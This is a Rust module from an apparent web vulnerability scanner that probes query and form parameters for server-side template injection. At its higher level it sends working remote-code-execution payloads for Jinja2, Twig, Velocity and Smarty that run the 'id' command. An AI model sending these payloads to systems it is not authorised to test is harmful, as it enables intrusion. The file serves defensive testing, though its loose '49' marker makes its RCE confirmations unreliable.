use crate::core::HttpClient;
use crate::models::{Finding, HttpData, Severity};

/// SSTI (Server-Side Template Injection) detection
pub async fn check_ssti(client: &HttpClient, url: &str, data: &HttpData, intensity_level: u8) -> Vec<Finding> {
    let mut findings = Vec::new();

    let injection_points = extract_ssti_points(url, data);
    if injection_points.is_empty() {
        return findings;
    }

    // Level 2: Basic SSTI detection via math expressions
    if intensity_level >= 2 {
        findings.extend(check_ssti_reflection(client, &injection_points).await);
    }

    // Level 3: Advanced engine-specific detection
    if intensity_level >= 3 {
        findings.extend(check_ssti_advanced(client, &injection_points).await);
    }

    findings
}

#[derive(Debug, Clone)]
struct InjectionPoint {
    param: String,
    url: String,
}

fn extract_ssti_points(url: &str, data: &HttpData) -> Vec<InjectionPoint> {
    let mut points = Vec::new();

    if let Ok(parsed) = url::Url::parse(url) {
        for (key, _value) in parsed.query_pairs() {
            if !key.is_empty() {
                points.push(InjectionPoint {
                    param: key.to_string(),
                    url: url.to_string(),
                });
            }
        }
    }

    for form in &data.forms {
        let base_url = form.action.as_deref().unwrap_or(url);
        for field in &form.visible_fields {
            points.push(InjectionPoint {
                param: field.name.clone(),
                url: base_url.to_string(),
            });
        }
    }

    points
}

fn inject_param(base_url: &str, param: &str, value: &str) -> String {
    let encoded = url::form_urlencoded::byte_serialize(value.as_bytes()).collect::<String>();
    if let Ok(mut parsed) = url::Url::parse(base_url) {
        let mut pairs: Vec<(String, String)> = parsed
            .query_pairs()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();

        let mut found = false;
        for (k, v) in pairs.iter_mut() {
            if *k == param {
                *v = value.to_string();
                found = true;
                break;
            }
        }
        if !found {
            pairs.push((param.to_string(), value.to_string()));
        }

        let query: Vec<String> = pairs.iter().map(|(k, v)| format!("{}={}", urlencoding(k), urlencoding(v))).collect();
        parsed.set_query(Some(&query.join("&")));
        parsed.to_string()
    } else {
        if base_url.contains('?') {
            format!("{}&{}={}", base_url, param, encoded)
        } else {
            format!("{}?{}={}", base_url, param, encoded)
        }
    }
}

fn urlencoding(s: &str) -> String {
    url::form_urlencoded::byte_serialize(s.as_bytes()).collect()
}

/// Level 2: Math expression evaluation test
async fn check_ssti_reflection(client: &HttpClient, points: &[InjectionPoint]) -> Vec<Finding> {
    let mut findings = Vec::new();

    // {{7*7}} evaluates to 49 in many template engines
    let math_payloads = [
        ("{{7*7}}", "49", "Jinja2/Twig/Django"),
        ("{{7*'7'}}", "7777777", "Jinja2"),
        ("${7*7}", "49", "Freemarker/Velocity"),
        ("<%= 7*7 %>", "49", "ERB/EJS"),
        ("#{7*7}", "49", "Pug/Jade"),
        ("{7*7}", "49", "Smarty-style"),
        ("[[7*7]]", "49", "MooTools-style"),
    ];

    for point in points.iter().take(5) {
        for (payload, expected, engine) in &math_payloads {
            let test_url = inject_param(&point.url, &point.param, payload);

            match client.fetch_url(&test_url).await {
                Ok(response) => {
                    if let Some(ref body) = response.body {
                        if body.contains(expected) && !body.contains(payload) {
                            findings.push(Finding::new(
                                "ssti",
                                format!("Potential SSTI: {} template engine detected", engine),
                                Severity::High,
                                format!(
                                    "Parameter '{}' evaluated the expression '{}' to '{}', indicating {} template injection. SSTI can lead to remote code execution.",
                                    point.param, payload, expected, engine
                                ),
                                format!("URL: {}\nPayload: {}\nExpected: {}\nFound in response", test_url, payload, expected),
                                "Never pass user input to template rendering functions. Use sandboxed template engines or context-aware escaping.",
                                &test_url,
                            ));
                            break;
                        }
                    }
                }
                Err(_) => continue,
            }
        }
    }

    findings
}

/// Level 3: Engine-specific RCE payloads
async fn check_ssti_advanced(client: &HttpClient, points: &[InjectionPoint]) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Engine-specific identification payloads
    let engine_payloads = [
        // Jinja2 / Flask
        ("{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}", Severity::Critical, "Jinja2 RCE"),
        // Twig / PHP
        ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", Severity::Critical, "Twig RCE"),
        // Freemarker / Java
        ("${product}${7*7}", Severity::High, "Freemarker"),
        // Velocity / Java
        ("#set($x='')$x.class.forName('java.lang.Runtime')", Severity::Critical, "Velocity RCE"),
        // Smarty / PHP
        ("{system('id')}", Severity::Critical, "Smarty RCE"),
    ];

    for point in points.iter().take(3) {
        for (payload, severity, engine) in &engine_payloads {
            let test_url = inject_param(&point.url, &point.param, payload);

            match client.fetch_url(&test_url).await {
                Ok(response) => {
                    if let Some(ref body) = response.body {
                        let markers = ["uid=", "gid=", "groups=", "root:", "49", "class java.lang"];
                        for marker in &markers {
                            if body.contains(marker) {
                                findings.push(Finding::new(
                                    "ssti",
                                    format!("SSTI {} confirmed — potential RCE", engine),
                                    severity.clone(),
                                    format!(
                                        "Parameter '{}' is vulnerable to {} template injection. Response contained '{}', indicating successful code execution.",
                                        point.param, engine, marker
                                    ),
                                    format!("URL: {}\nPayload: {}\nMarker: {}", test_url, payload, marker),
                                    "Urgently disable server-side template rendering of user input. Apply template sandboxing.",
                                    &test_url,
                                ));
                                break;
                            }
                        }
                    }
                }
                Err(_) => continue,
            }
        }
    }

    findings
}
